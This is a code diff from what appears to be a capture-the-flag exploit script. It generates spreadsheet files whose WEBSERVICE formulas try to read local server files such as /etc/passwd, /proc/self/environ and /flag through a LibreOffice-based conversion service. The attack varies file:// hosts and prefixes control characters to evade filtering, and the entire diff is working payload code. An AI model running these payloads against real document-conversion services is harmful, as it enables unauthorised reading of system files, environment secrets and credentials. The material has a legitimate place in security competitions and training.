@@ -49,14 +49,19 @@ def formula_ods(formula):
     return out.getvalue()
 
 
-for path in (
-    "/etc/passwd",
-    "/flag",
-    "/flag.txt",
-    "/tmp/flag",
-    "/proc/self/environ",
-    "/etc/hostname",
-    "//etc/passwd",
+formulas = []
+for url in (
+    " file://webapp/lo/program/versionrc",
+    " file://webapp/etc/passwd",
+    " file://webapp/flag",
+    " file://localhost/lo/program/versionrc",
+    " file://localhost/flag",
+    " file://127.0.0.1/flag",
+    " file:///lo/program/versionrc",
 ):
-    formula = f'COM.MICROSOFT.WEBSERVICE("{path}")'
+    formulas.append(f'COM.MICROSOFT.WEBSERVICE("{url}")')
+for code in (9, 10, 11, 12, 13):
+    formulas.append(f'COM.MICROSOFT.WEBSERVICE(CHAR({code})&"file://webapp/flag")')
+
+for formula in formulas:
     send(formula_ods(formula), "formula.ods", "csv", formula)
